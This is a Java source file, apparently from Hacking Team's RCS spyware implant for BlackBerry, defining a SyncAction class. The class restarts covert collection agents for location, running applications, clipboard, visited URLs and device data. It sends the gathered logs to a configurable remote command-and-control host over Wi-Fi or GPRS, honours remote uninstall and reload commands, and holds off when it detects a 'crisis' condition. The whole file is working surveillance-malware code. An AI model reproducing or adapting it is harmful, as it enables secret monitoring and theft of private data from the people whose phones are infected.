/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : SyncAction.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.action;

import java.io.EOFException;

import net.rim.device.api.util.DataBuffer;

import com.ht.rcs.blackberry.AgentManager;
import com.ht.rcs.blackberry.Common;
import com.ht.rcs.blackberry.agent.Agent;
import com.ht.rcs.blackberry.log.LogCollector;
import com.ht.rcs.blackberry.transfer.Transfer;
import com.ht.rcs.blackberry.transfer.WifiConnection;
import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.Utils;
import com.ht.rcs.blackberry.utils.WChar;

public class SyncAction extends SubAction {
    private static Debug debug = new Debug("SyncAction", DebugLevel.VERBOSE);

    LogCollector logCollector;
    AgentManager agentManager;
    Transfer transfer;

    boolean wifi;
    boolean gprs;

    boolean ssl = false;

    String host = "";
    int port = 80;

    public SyncAction(int actionId_, byte[] confParams) {
        super(actionId_);
        parse(confParams);

        // #ifdef DBC
//@        Check.requires(actionId == ACTION_SYNC, "ActionId scorretto");
        // #endif

        logCollector = LogCollector.getInstance();
        agentManager = AgentManager.getInstance();
        transfer = Transfer.getInstance();
    }

    public SyncAction(String host_) {
        super(ACTION_SYNC);
        this.host = host_;
    }

    public boolean execute() {
        // #debug
        debug.info("SyncAction execute");

        if (statusObj.crisis()) {
            // #debug
            debug.warn("SyncAction - no sync, we are in crisis");
            return false;
        }

        wantReload = false;
        wantUninstall = false;

        // #ifdef DBC
//@        Check.asserts(logCollector != null, "logCollector == null");
        // #endif

        transfer.init(host, port, ssl, wifi);

        // Stop degli agenti che producono un singolo log
        agentManager.reStart(Agent.AGENT_POSITION);
        agentManager.reStart(Agent.AGENT_APPLICATION);
        agentManager.reStart(Agent.AGENT_CLIPBOARD);
        agentManager.reStart(Agent.AGENT_URL);

        // l'agente device si comporta diversamente
        agentManager.reStart(Agent.AGENT_DEVICE);

        Utils.sleep(2500);

        boolean ret = transfer.send();

        this.wantUninstall = transfer.uninstall;
        this.wantReload = transfer.reload;

        if (ret) {
            // #debug
            debug.trace("InternetSend OK");
            return true;
        }

        // #debug
        debug.error("InternetSend Unable to perform");

        return false;
    }

    protected boolean parse(byte[] confParams) {
        DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);

        try {
            this.gprs = databuffer.readInt() == 1;
            this.wifi = databuffer.readInt() == 1;

            int len = databuffer.readInt();
            byte[] buffer = new byte[len];
            databuffer.readFully(buffer);

            host = WChar.getString(buffer, true);

        } catch (EOFException e) {
            // #debug
            debug.error("params FAILED");
            return false;
        }

        return true;
    }

}
